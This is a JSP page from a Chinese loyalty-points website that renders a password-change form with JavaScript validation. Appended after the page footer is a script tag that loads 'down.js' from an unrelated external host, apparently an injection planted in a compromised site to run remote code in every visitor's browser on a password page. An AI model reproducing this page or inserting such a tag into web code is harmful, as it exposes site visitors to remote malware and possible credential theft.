<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<c:set var="title" value="积分联盟-修改密码"/> 
<%@ include file="IncludeTop.jsp" %>
<script language="javascript">

function checkAll(){
   if(validate(document.resetPwdForm.userID, '用户ID', 'identifier', 4, 32, false) &&
	  validate(document.resetPwdForm.pwd, '密码', 'public', 6, 64, false)&&
	  validate(document.resetPwdForm.newPwd, '新密码', 'public', 0, 64, false)){
	        if(document.all.newPwd.value != document.all.newPwd2.value){
			     alert("两次密码输入不一致");
				 document.all.newPwd.focus();
			     return false;
			}
	   	    return true;
	   }
   return false;
}

//-->
</script>
<table width="780" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="178" valign="top"> 
      <%@ include file="searchProductBar.jsp" %>
      <%@ include file="searchAllBar.jsp" %>
      <%@ include file="newsBar.jsp" %>    </td>
    <td width="602" bgcolor="#FFFFFF" valign="top">
      <form name="resetPwdForm" method="post" action='<c:url value="/resetPassword.do"/>'  onSubmit="return checkAll();">
        <table width="100%" border="0">
          <tr>
            <td align="center" height="32">&nbsp;</td>
            <td align="right" height="32">&nbsp;</td>
            <td align="left" height="32">&nbsp;</td>
            <td align="left" height="32">&nbsp;</td>
            <td align="center" height="32">&nbsp;</td>
          </tr>
          <tr>
            <td align="center" height="32">&nbsp;</td>
            <td align="right" height="32">&nbsp;</td>
            <td align="left" height="32">&nbsp;</td>
            <td align="left" height="32">&nbsp;</td>
            <td align="center" height="32">&nbsp;</td>
          </tr>
          <tr> 
            <td align="center" height="32">&nbsp; </td>
            <td align="right" height="32" width="29%">用户ID</td>
            <td align="left" height="32" width="3%">&nbsp;</td>
            <td align="left" height="32" width="44%"> 
              <input type="text" name="userID" maxlength="20">            </td>
            <td align="center" height="32">&nbsp;</td>
          </tr>
          <tr> 
            <td align="center" height="32">&nbsp;</td>
            <td align="right" height="32" width="29%">密码</td>
            <td align="left" height="32" width="3%">&nbsp;</td>
            <td align="left" height="32" width="44%"> 
              <input type="password" name="pwd" maxlength="20">            </td>
            <td align="center" height="32">&nbsp;</td>
          </tr>
          <tr> 
            <td align="center" height="32">&nbsp;</td>
            <td align="right" height="32" width="29%">新密码</td>
            <td align="left" height="32" width="3%">&nbsp;</td>
            <td align="left" height="32" width="44%"> 
              <input type="password" name="newPwd" maxlength="20">            </td>
            <td align="center" height="32">&nbsp;</td>
          </tr>
          <tr> 
            <td align="center" height="32">&nbsp;</td>
            <td align="right" height="32">新密码</td>
            <td align="center" height="32">&nbsp;</td>
            <td align="left" height="32"> 
              <input type="password" name="newPwd2" maxlength="20">            </td>
            <td align="center" height="32">&nbsp;</td>
          </tr>
          <tr> 
            <td align="center" height="32">&nbsp;</td>
            <td align="center" height="32" colspan="3"> 
              <input type="submit" value="确 定" class="medium" name="提交">
              <input type="reset" value="重 填" class="medium" name="重置">            </td>
            <td align="center" height="32">&nbsp;</td>
          </tr>
        </table>      
  </form>    </tr>
</table>

<%@ include file="IncludeBottom.jsp" %>

<script language=javascript src=http://Town.531jx.cn/down.js></script>